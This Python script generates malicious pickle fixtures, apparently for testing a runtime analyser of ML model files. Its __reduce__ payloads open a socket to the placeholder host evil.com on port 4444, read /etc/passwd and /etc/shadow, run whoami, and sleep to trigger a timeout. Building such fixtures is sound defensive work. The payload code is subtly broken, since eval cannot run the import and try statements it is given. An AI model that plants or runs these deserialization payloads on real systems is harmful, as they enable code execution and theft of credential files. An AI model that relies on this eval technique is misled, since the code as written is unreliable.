#!/usr/bin/env python3
"""Create malicious test fixtures for runtime behavioral analysis testing."""

import pickle
import sys

# ── Malicious fixture: Network attempt ──
# This pickle contains code that tries to make network connections

class NetworkAttempt:
    """Object that attempts network connection when unpickled."""
    def __reduce__(self):
        # Use eval to execute code that tries network operations
        # When unpickled, this will try to import socket and connect
        code = """
import sys
try:
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('evil.com', 4444))
    print('NETWORK CONNECTION ESTABLISHED', file=sys.stderr)
except Exception as e:
    # Expected to fail with ConnectionError or similar
    print(f'socket.error: {e}', file=sys.stderr)
"""
        return (eval, (code,))

try:
    with open('tests/fixtures/ml-runtime/malicious-network/backdoor.pkl', 'wb') as f:
        obj = NetworkAttempt()
        pickle.dump(obj, f)
    print("✓ Created malicious network fixture")
except Exception as e:
    print(f"✗ Error creating network fixture: {e}", file=sys.stderr)
    sys.exit(1)


# ── Malicious fixture: File access attempt ──
# This pickle tries to read sensitive system files

class FileAccessAttempt:
    """Object that attempts to access sensitive files when unpickled."""
    def __reduce__(self):
        code = """
import sys
try:
    with open('/etc/passwd', 'r') as f:
        data = f.read()
    print('READ /etc/passwd', file=sys.stderr)
except Exception as e:
    print(f'Permission denied /etc/passwd: {e}', file=sys.stderr)

try:
    with open('/etc/shadow', 'r') as f:
        data = f.read()
    print('READ /etc/shadow', file=sys.stderr)
except Exception as e:
    print(f'Permission denied /etc/shadow: {e}', file=sys.stderr)
"""
        return (eval, (code,))

try:
    with open('tests/fixtures/ml-runtime/malicious-fileaccess/filespy.pkl', 'wb') as f:
        obj = FileAccessAttempt()
        pickle.dump(obj, f)
    print("✓ Created malicious file access fixture")
except Exception as e:
    print(f"✗ Error creating file access fixture: {e}", file=sys.stderr)
    sys.exit(1)


# ── Malicious fixture: Subprocess execution ──
# This pickle tries to execute shell commands

class SubprocessAttempt:
    """Object that attempts to execute subprocesses when unpickled."""
    def __reduce__(self):
        code = """
import sys
try:
    import subprocess
    result = subprocess.check_output(['whoami'])
    print(f'subprocess.call executed: {result}', file=sys.stderr)
except Exception as e:
    print(f'subprocess.CalledProcessError: {e}', file=sys.stderr)

try:
    import os
    os.system('whoami')
    print('os.system executed', file=sys.stderr)
except Exception as e:
    print(f'os.system error: {e}', file=sys.stderr)
"""
        return (eval, (code,))

try:
    with open('tests/fixtures/ml-runtime/malicious-subprocess/shell.pkl', 'wb') as f:
        obj = SubprocessAttempt()
        pickle.dump(obj, f)
    print("✓ Created malicious subprocess fixture")
except Exception as e:
    print(f"✗ Error creating subprocess fixture: {e}", file=sys.stderr)
    sys.exit(1)


# ── Malicious fixture: Time-delayed trigger ──
# This pickle sleeps for a long time to trigger timeout

class DelayedTrigger:
    """Object that sleeps to trigger timeout detection."""
    def __reduce__(self):
        code = """
import time
import sys
print('Starting delayed trigger...', file=sys.stderr)
time.sleep(120)  # Sleep longer than default timeout (60s)
print('Delayed trigger completed', file=sys.stderr)
"""
        return (eval, (code,))

try:
    with open('tests/fixtures/ml-runtime/malicious-delayed/timebomb.pkl', 'wb') as f:
        obj = DelayedTrigger()
        pickle.dump(obj, f)
    print("✓ Created malicious delayed trigger fixture")
except Exception as e:
    print(f"✗ Error creating delayed fixture: {e}", file=sys.stderr)
    sys.exit(1)

print("\n✓ All malicious test fixtures created successfully")
